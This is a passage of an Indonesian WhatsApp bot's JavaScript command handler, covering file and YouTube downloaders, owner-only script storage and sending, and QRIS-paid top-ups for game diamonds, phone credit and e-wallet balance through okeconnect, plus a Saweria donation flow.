if (rest !== undefined) await fs.unlinkSync(rest)
await conn.sendMessage(jid, {text: `Jpm *${opsijpm}* berhasil dikirim ke ${res.length} grup chat`}, {quoted: m})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}
}
break

case "googledrive": case "gdrive": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply(example("linknya"))
try {
    const res = await fetchJson(`https://restapi-v2.simplebot.my.id/download/gdrive?url=${text}`)
   await conn.sendMessage(m.chat, { document: { url: res.result.downloadUrl }, mimetype: res.result.mimetype, fileName: `${res.result.fileName}`}, { quoted : m })
} catch (e) {
await m.reply(`Error! result tidak ditemukan`)
}}
break

case "terabox": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith('https://')) return m.reply("Link tautan tidak valid")
await fetchJson(`https://restapi-v2.simplebot.my.id/download/terabox?url=${text}`).then(async (res) => {
if (!res.status) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {document: {url: res.result}, mimetype: "application/zip", fileName: "Terabox.zip", caption: "*Terabox Downloader ✅*"}, {quoted: m})

}).catch((e) => m.reply("Error link tautan tidak didukung"))
}
break

case "svsc": {
if (!isCreator) return
if (!text || !text.endsWith(".zip")) return m.reply(example("cpanel.zip & reply scnya"))
if (!/zip/.test(mime)) return m.reply(example("cpanel.zip & reply scnya"))
if (!m.quoted) return m.reply(example("cpanel & reply scnya"))
let ff = await m.quoted.download()
let nama = text
await fs.writeFileSync("./library/database/savesc/"+nama, ff)
return m.reply(`Berhasil menyimpan script *${nama}.zip*`)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "listsc": {
if (!isCreator) return
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return m.reply("Tidak ada script tersimpan")
let teks = ""
for (let e of scnya) {
teks += e + "\n"
}
m.reply(teks)
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'setapido': case 'setapidigitalocean': case 'upapido': {
    if (!isCreator) return m.reply('*[ System Notice ]* Khusus Owner');
    if (text || m.quoted) {
        const newteks = m.quoted ? m.quoted.text : text;
        global.apiDigitalOcean = newteks;
        
     
        try {
            const fs = require('fs');
            const path = './settings.js'; 
           let content = fs.readFileSync(path, 'utf8');
            
            
            const apidoRegex = /(global\.apiDigitalOcean\s*=\s*['"`])([^'"`]*?)(['"`])/;
            content = content.replace(apidoRegex, `$1${newteks}$3`);
            
           
            fs.writeFileSync(path, content);
            
            await conn.sendMessage(m.chat, { text: "_Berhasil Mengganti Api Digital Ocean✅_" }, { quoted: m });
        } catch (error) {
            console.error('Error updating settings.js:', error);
            await conn.sendMessage(m.chat, { text: "_Gagal menyimpan perubahan ke file settings.js_" }, { quoted: m });
        }
    } else {
        await conn.sendMessage(m.chat, { text: `*Format salah!*\nContoh: ${prefix + command} <apidigitalocean>` }, { quoted: m });
    }
}
break

case "sendsc2": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return m.reply("Tidak ada script tersimpan")
if (!text) return m.reply(example("namasc|6285###"))
if (!text.split("|'")) return m.reply(example("namasc|6285###"))
const input = m.mentionedJid[0] ? m.mentionedJid[0] : text.split("|")[1].replace(/[^0-9]/g, "") + "@s.whatsapp.net"
var onWa = await conn.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
let namasc = text.split("|")[0]
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return m.reply('Nama script tidak ditemukan')
await conn.sendMessage(input, {document: fs.readFileSync("./library/database/savesc/"+namasc), fileName: namasc, mimetype: "application/zip", caption: `Script ${namasc}`}, {quoted: m})
m.reply(`Berhasil mengirim script *${namasc}* ke ${input.split("@")[0]}`)
}
break

case "delsc": {
if (!isCreator) return 
let scnya = await fs.readdirSync("./library/database/savesc").filter(i => i !== "verif.js")
if (scnya.length < 1) return m.reply("Tidak ada script tersimpan")
if (!text) return m.reply(example("namasc"))
let namasc = text
namasc = namasc.toLowerCase()
if (!scnya.includes(namasc)) return m.reply('Nama script tidak ditemukan')
await fs.unlinkSync("./library/database/savesc/"+namasc)
m.reply(`Berhasil menghapus script *${namasc}*`)
}
break

case "topupdiamond": {
if (m.isGroup) return m.reply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!args[0] || !args[0].split("|")) return m.reply(example("id|serverid"))
if (!args[1] || !args[1].split("|")) {
let nodana = args[0].split("|")[0]
let serverid = args[0].split("|")[1]
const axios = require('axios');
const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
 let dana = data.filter(item => /TPG Diamond Mobile Legends/i.test(item.produk) && item.harga > 0)
 .sort((a, b) => a.harga - b.harga);
 let dana1 = data.filter(item => /TPG Diamond Free Fire/i.test(item.produk) && item.harga > 0)
 .sort((a, b) => a.harga - b.harga);
 let dana2 = data.filter(item => /TPG Game Mobile PUBG/i.test(item.produk) && item.harga > 0)
 .sort((a, b) => a.harga - b.harga);
 let dana3 = data.filter(item => /TPG Stumble Guys/i.test(item.produk) && item.harga > 0)
 .sort((a, b) => a.harga - b.harga);
 dana = [...dana1, ...dana, ...dana2, ...dana3]

 let sections = dana.map((item) => {
 const status = item.status === "1" ? "✅" : "❌";
 return {
 title: `${item.keterangan}`,
 description: `Rp${item.harga}`, 
 id: `${prefix}topupdiamond ${nodana}|${serverid} ${item.kode}|${item.harga}|${item.keterangan}`
 };
})
return conn.sendMessage(m.chat, {
 buttons: [
 {
 buttonId: 'action',
 buttonText: { displayText: 'ini pesan interactiveMeta' },
 type: 4,
 nativeFlowInfo: {
 name: 'single_select',
 paramsJson: JSON.stringify({
 title: 'Pilih Jumlah',
 sections: [
 {
 title: 'List Layanan Topup Diamond',
 highlight_label: 'Recommended',
 rows: sections 
 }
 ]
 })
 }
 }
 ],
 footer: `© KyzzX Botz`,
 headerType: 1,
 viewOnce: true,
 text: "Pilih Jumlah Topup Diamond\n",
 contextInfo: {
 isForwarded: true, 
 mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
 },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = args[1].split("|")[1]
Obj.nominal = args[1].split("|")[2]
Obj.kode = args[1].split("|")[0]
Obj.id = args[0].split("|")[0]
Obj.serverid = args[0].split("|")[1]
Obj.nodana = Obj.id + Obj.serverid
const UrlQr = global.qrisOrderKuota
const amount = Number(Obj.harga) + generateRandomNumber(110, 250)

const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
 
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* ${Obj.nominal}
 *• Expired :* 5 menit

*Note :* 
Qris payment is only valid for 5 minutes, if it has passed 5 minutes the payment is declared invalid!
If the payment is successful the bot will automatically send a notification of your payment status.

Ketik *batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
 footer: `${botname}`,
 buttons: [
 {
 buttonId: `${prefix}batalbeli`,
 buttonText: { displayText: 'Batalkan Pembelian' },
 type: 1
 }
 ],
 headerType: 1,
 viewOnce: true,
 image: {url: get.data.result.qrImageUrl}, 
 caption: teks3,
 contextInfo: {
 mentionedJid: [m.sender]
 },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "KYZZXBOTZ" + `${Date.now()}`
await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {

let dt = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
}
}
}
}
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "isipulsa": {
if (m.isGroup) return m.reply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!args[0]) return m.reply(example("085XXX"))
if (!args[0].startsWith("08")) return m.reply(example("085XXX"))
if (!args[1] || !args[1].split("|")) {
let nodana = args[0].trim()
const axios = require('axios');
const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /Axis Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana0 = data.filter(item => /Telkomsel Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana1 = data.filter(item => /Smartfren Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana2 = data.filter(item => /Three Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana3 = data.filter(item => /XL Transfer/.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);   
 dana = [...dana, ...dana0, ...dana1, ...dana2, ...dana3]

        let sections = dana.map((item) => {
            const status = item.status === "1" ? "✅" : "❌";
            return {
                title: `${item.keterangan}`,
                description: `Rp${item.harga}`, 
                id: `${prefix}isipulsa ${nodana} ${item.kode}|${item.harga}|${item.keterangan}`
            };
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Jumlah',
          sections: [
            {
              title: 'List Layanan Isi Pulsa',
              highlight_label: 'Recommended',
              rows: sections             
            }
          ]
        })
      }
      }
  ],
  footer: `© sungsu-cpanel`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Nominal Isi Pulsa\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = args[1].split("|")[1]
Obj.nominal = args[1].split("|")[2]
Obj.kode = args[1].split("|")[0]
Obj.nodana = args[0].trim()
const UrlQr = global.qrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)
const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* ${Obj.nominal}
 *• Expired :* 5 menit

*Note :* 
Qris payment is only valid for 5 minutes, if it has passed 5 minutes the payment is declared invalid!
If the payment is successful the bot will automatically send a notification of your payment status.

Ketik *batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "KYZZXBOTZ" + `${Date.now()}`
await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
break
}
await sleep(5000)
}
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "topupsaldo": {
if (m.isGroup) return m.reply("Pembelian saldo dana hanya bisa di dalam private chat")
if (db.users[m.sender].status_deposit) return m.reply("Masih ada transaksi yang belum diselesaikan, ketik *.batalbeli* untuk membatalkan transaksi sebelumnya!")
if (!args[0]) return m.reply(example("085XXX"))
if (!args[0].startsWith("08")) return m.reply(example("085XXX"))
if (!args[1] || !args[1].split("|")) {
let nodana = args[0].trim()
const axios = require('axios');
const { data } = await axios.get("https://www.okeconnect.com/harga/json?id=905ccd028329b0a");
        let dana = data.filter(item => /Top Up Saldo GO-JEK/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        let dana1 = data.filter(item => /Top Up Saldo DANA/i.test(item.produk) && item.harga > 0)
            .sort((a, b) => a.harga - b.harga);
        dana = [...dana1, ...dana]

        let sections = dana.map((item) => {
            const status = item.status === "1" ? "✅" : "❌";
            return {
                title: `${item.keterangan}`,
                description: `Rp${item.harga}`, 
                id: `${prefix}topupsaldo ${nodana} ${item.kode}|${item.harga}|${item.keterangan}`
            };
})
return conn.sendMessage(m.chat, {
  buttons: [
    {
    buttonId: 'action',
    buttonText: { displayText: 'ini pesan interactiveMeta' },
    type: 4,
    nativeFlowInfo: {
        name: 'single_select',
        paramsJson: JSON.stringify({
          title: 'Pilih Jumlah',
          sections: [
            {
              title: 'List Nominal Topup Saldo',
              highlight_label: 'Recommended',
              rows: sections             
            }
          ]
        })
      }
      }
  ],
  footer: `© KyzzX Botz`,
  headerType: 1,
  viewOnce: true,
  text: "Pilih Jumlah Topup Saldo\n",
  contextInfo: {
   isForwarded: true, 
   mentionedJid: [m.sender, global.owner+"@s.whatsapp.net"], 
  },
}, {quoted: m}) 
}
let Obj = {}
Obj.harga = args[1].split("|")[1]
Obj.nominal = args[1].split("|")[2]
Obj.kode = args[1].split("|")[0]
Obj.nodana = args[0].trim()
const UrlQr = global.qrisOrderKuota
const amount  = Number(Obj.harga) + generateRandomNumber(110, 250)

const axios = require('axios');
const get = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/createpayment?apikey=new2025&amount=${amount}&codeqr=${UrlQr}`)
const teks3 = `
*乂 INFORMASI PEMBAYARAN*
  
 *• ID :* ${get.data.result.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(get.data.result.amount)}
 *• Barang :* ${Obj.nominal}
 *• Expired :* 5 menit

*Note :* 
Qris payment is only valid for 5 minutes, if it has passed 5 minutes the payment is declared invalid!
If the payment is successful the bot will automatically send a notification of your payment status.

Ketik *batalbeli* untuk membatalkan
`
let msgQr = await conn.sendMessage(m.chat, {
  footer: `${botname}`,
  buttons: [
    {
      buttonId: `${prefix}batalbeli`,
      buttonText: { displayText: 'Batalkan Pembelian' },
      type: 1
    }
  ],
  headerType: 1,
  viewOnce: true,
  image: {url: get.data.result.qrImageUrl}, 
  caption: teks3,
  contextInfo: {
   mentionedJid: [m.sender]
  },
})
db.users[m.sender].status_deposit = true
db.users[m.sender].saweria = {
msg: msgQr, 
chat: m.sender,
idDeposit: get.data.result.transactionId, 
amount: get.data.result.amount.toString(), 
exp: function () {
setTimeout(async () => {
if (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount == db.users[m.sender].saweria.amount) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: "QRIS Pembayaran telah expired!"}, {quoted: db.users[m.sender].saweria.msg})
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
delete db.users[m.sender].saweria
}
}, 300000)
}
}

await db.users[m.sender].saweria.exp()

while (db.users[m.sender].status_deposit == true && db.users[m.sender].saweria && db.users[m.sender].saweria.amount) {
await sleep(8000)
const axios = require('axios');
const resultcek = await axios.get(`https://simpelz.fahriofficial.my.id/api/orkut/cekstatus?apikey=new2025&merchant=${global.merchantIdOrderKuota}&keyorkut=${global.apiOrderKuota}`)
const req = await resultcek.data
if (db.users[m.sender].saweria && req?.result?.amount == db.users[m.sender].saweria.amount) {
db.users[m.sender].status_deposit = false
await clearInterval(db.users[m.sender].saweria.exp)
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*PEMBAYARAN BERHASIL DITERIMA ✅*

 *• ID :* ${db.users[m.sender].saweria.transactionId}
 *• Total Pembayaran :* Rp${await toIDR(db.users[m.sender].saweria.amount)}
 *• Barang :* ${Obj.nominal}
`}, {quoted: db.users[m.sender].saweria.msg})
const idtrx = "KYZZXBOTZ" + `${Date.now()}`

await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
let statuse = true
while (statuse) {
let dt = await fetchJson(`https://h2h.okeconnect.com/trx?memberID=${global.merchantIdOrderKuota}&product=${Obj.kode}&dest=${Obj.nodana}&refID=&pin=${global.pinH2H}&password=${global.passwordH2H}`)
if (/status Sukses/.test(dt)) {
await conn.sendMessage(db.users[m.sender].saweria.chat, {text: `
*Topup ${db.users[m.sender].saweria.keterangan} Berhasil ✅*

 *• Nomor Tujuan :* ${Obj.nodana}
 *• Status :* Sukses
`}, {quoted: db.users[m.sender].saweria.msg})
statuse = false
break
}
await sleep(5000)
}
await conn.sendMessage(db.users[m.sender].saweria.chat, { delete: db.users[m.sender].saweria.msg.key })
delete db.users[m.sender].saweria
}
}

}
break

case "yts": case "syt": case "youtubesearch": case "searchyoutube": {
    if (!text) return m.reply('Masukkan kata kunci pencarian!')
    
    await conn.sendMessage(m.chat, { react: { text: '🔎', key: m.key } })
    
    try {
        let response = await fetch(`https://api-rest-rizzkyxofc.vercel.app/api/search/ytsearch?q=${encodeURIComponent(text)}`)
        let json = await response.json()
        
        if (!json.status || !json.result.results || json.result.results.length === 0) 
            return m.reply("Video tidak ditemukan!")

        let results = json.result.results.slice(0, 20) 
        let teks = `🔎 *Hasil Pencarian YouTube untuk:* _${text}_\n\n`
        let cards = []

        for (let vid of results) {
            teks += `*🎬 ${vid.title}*\n📅 ${vid.ago} | ⏳ ${vid.timestamp} | 👁 ${vid.views}\n🔗 ${vid.url}\n\n`

            let imgsc = await prepareWAMessageMedia({ image: { url: vid.thumbnail } }, { upload: conn.waUploadToServer })
            cards.push({
                header: proto.Message.InteractiveMessage.Header.fromObject({
                    title: vid.title,
                    hasMediaAttachment: true,
                    ...imgsc
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
                    buttons: [
                        {
                            name: "cta_copy",
                            buttonParamsJson: `{
                                "display_text": "Salin Link",
                                "copy_text": "${vid.url}"
                            }`
                        }
                    ]
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: `👤 ${vid.author.name || "Unknown"} | 👁 ${vid.views} | ⏳ ${vid.timestamp}`
                })
            })
        }

        await m.reply(teks)

        const msg = await generateWAMessageFromContent(m.chat, {
            viewOnceMessage: {
                message: {
                    messageContextInfo: {
                        deviceListMetadata: {},
                        deviceListMetadataVersion: 2
                    },
                    interactiveMessage: proto.Message.InteractiveMessage.fromObject({
                        body: proto.Message.InteractiveMessage.Body.fromObject({
                            text: `🔎 Berikut adalah hasil pencarian untuk *${text}*`
                        }),
                        carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
                            cards: cards
                        })
                    })
                }
            }
        }, { userJid: m.sender, quoted: m })

        conn.relayMessage(m.chat, msg.message, { messageId: msg.key.id })
        
        await conn.sendMessage(m.chat, { react: { text: '', key: m.key } })
    } catch (error) {
        console.error(error)
        return m.reply('Terjadi kesalahan saat mencari video!')
    }
}
break
//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "yts2": case "searchyt2": case "searchyoutube2": case "syt2": {
if (!text) return m.reply(example('we dont talk'))
await conn.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let ytsSearch = await yts(text)
const anuan = ytsSearch.all
let teks = "\n    *[ Result From Youtube Search 🔍 ]*\n\n"
for (let res of anuan) {
teks += `* *Title :* ${res.title}
* *Durasi :* ${res.timestamp}
* *Upload :* ${res.ago}
* *Views :* ${res.views}
* *Author :* ${res?.author?.name || "Unknown"}
* *Source :* ${res.url}\n\n`
}
await m.reply(teks)
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "ytmp3": {
if (!text) return m.reply(example("linknya"))
if (!text.startsWith("https://")) return m.reply("Link Tautan Tidak Valid")
await conn.sendMessage(m.chat, {react: {text: '🕖', key: m.key}})

var anu = await fetchJson("https://api.skyzopedia.us.kg/api/download/ytmp3?url="+text)
if (anu.download.audio) {
let urlMp3 = anu.download.audio
await conn.sendMessage(m.chat, {audio: {url: urlMp3}, mimetype: "audio/mpeg"}, {quoted: m})
} else {
return m.reply("Error! vidio atau lagu tidak ditemukan")
}
await conn.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "block": case "blok": {
if (!isCreator) return Reply(global.mess.owner)
if (m.isGroup && !m.quoted && !text) return m.reply(example("@tag/nomornya"))
const mem = !m.isGroup ? m.chat : m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : ""
await conn.updateBlockStatus(mem, "block")
if (m.isGroup) conn.sendMessage(m.chat, {text: `Berhasil memblokir @${mem.split('@')[0]}`, mentions: [mem]}, {quoted: m})
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//

case "mediafire": {
if (!text) return m.reply(example("linknya"))
if (!text.includes('mediafire.com')) return m.reply("Link tautan tidak valid")
await mediafire(text).then(async (res) => {
if (!res.link) return m.reply("Error! Result Not Found")
await conn.sendMessage(m.chat, {document: {url: res.link}, fileName: res.judul, mimetype: "application/"+res.mime.toLowerCase()}, {quoted: m})
}).catch((e) => m.reply("Error"))
}
break

//~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~//
case 'donate': case 'donasi': {
    if (m.isGroup) return m.reply(mess.group)
    
    let db_saweria = [];
    try {
        const data = fs.readFileSync("./source/saweria.json", 'utf8');
        db_saweria = JSON.parse(data);
        if (!Array.isArray(db_saweria) || db_saweria.length === 0) {
            return m.reply(`Belum login ke saweria. Gunakan ${prefix}login terlebih dahulu.`);
        }
    } catch (error) {
        return m.reply(`Belum login ke saweria. Gunakan ${prefix}login terlebih dahulu.`);
    }
    
    if (!q) return m.reply(`Contoh: ${prefix+command} 10000,Donasi untuk support`);
    
    const parts = q.split(',');
    if (parts.length < 1) return m.reply(`Contoh: ${prefix+command} 10000,Donasi untuk support`);
    
    const amount = parseInt(parts[0].trim());
    const message = parts.length > 1 ? parts.slice(1).join(',').trim() : 'Donasi';
    
    if (isNaN(amount) || amount < 1000) {
        return m.reply(`Jumlah donasi minimal 1000 rupiah.`);
    }
    
    try {
        await m.reply("Sedang membuat QR code pembayaran...");
        let Pay = new Saweria2(db_saweria[0]); 
        let res = await Pay.createPayment(amount, message);
        
        if (!res.status) {
            return m.reply(`Terjadi kesalahan saat membuat pembayaran:\n${res.msg}`);
        }
        
        let db_payments = [];
        try {
            const paymentsData = fs.readFileSync("./source/payments.json", 'utf8');
            db_payments = JSON.parse(paymentsData);
            if (!Array.isArray(db_payments)) {
                db_payments = [];
            }
        } catch (error) {
            db_payments = [];
        }
        
        db_payments.push({
            id: res.data.id,
            amount: res.data.amount,
            message: res.data.message,
            created_at: res.data.created_at,
            expired_at: res.data.expired_at,
            status: 'pending'
        });
        
        fs.writeFileSync("./source/payments.json", JSON.stringify(db_payments, null, 2), 'utf8');
        
        const buffer = Buffer.from(res.data.qr_image.split(',')[1], 'base64');
        await conn.sendMessage(m.chat, {
            image: buffer,
            caption: `🧾 *PAYMENT QR CODE*\n\n💰 *Jumlah:* Rp${res.data.amount.toLocaleString('id-ID')}\n💬 *Pesan:* ${res.data.message}\n⏱️ *Dibuat:* ${res.data.created_at}\n⏳ *Kadaluarsa:* ${res.data.expired_at}\n🆔 *ID:* ${res.data.id}\n\nSilakan scan QR Code untuk melakukan pembayaran.\nBot akan otomatis mengirimkan notifikasi jika pembayaran berhasil.`
        });
       
        if (!global.paymentIntervals) global.paymentIntervals = {};
        const intervalId = setInterval(async () => {
            try {
                let Pay = new Saweria2(db_saweria[0]);
                let statusRes = await Pay.checkPayment(res.data.id);
                
                if (statusRes.status) {

                    let updatedPayments = [];
                    try {
                        const paymentsData = fs.readFileSync("./source/payments.json", 'utf8');
                        updatedPayments = JSON.parse(paymentsData);
                        
                        if (Array.isArray(updatedPayments)) {
                            updatedPayments = updatedPayments.map(payment => {
                                if (payment.id === res.data.id) {
                                    payment.status = 'success';
                                }
                                return payment;
                            });
                            
                            fs.writeFileSync("./source/payments.json", JSON.stringify(updatedPayments, null, 2), 'utf8');
                        }
                    } catch (error) {
                        console.error('Error updating payment status:', error);
                    }
                    
                    await conn.sendMessage(m.chat, {
                        text: `✅ *PEMBAYARAN BERHASIL*\n\n*ID:* ${res.data.id}\n*Status:* Lunas\n\nTerima kasih atas donasi Anda!`
                    });
                    
                    clearInterval(global.paymentIntervals[res.data.id]);
                    delete global.paymentIntervals[res.data.id];
                }
            } catch (error) {
                console.error('Error checking payment:', error);
            }
        }, 30000); 
        
        global.paymentIntervals[res.data.id] = intervalId;
       
        setTimeout(() => {
            if (global.paymentIntervals[res.data.id]) {
                clearInterval(global.paymentIntervals[res.data.id]);
                delete global.paymentIntervals[res.data.id];
            }
        }, 10 * 60 * 1000);
        
    } catch (error) {
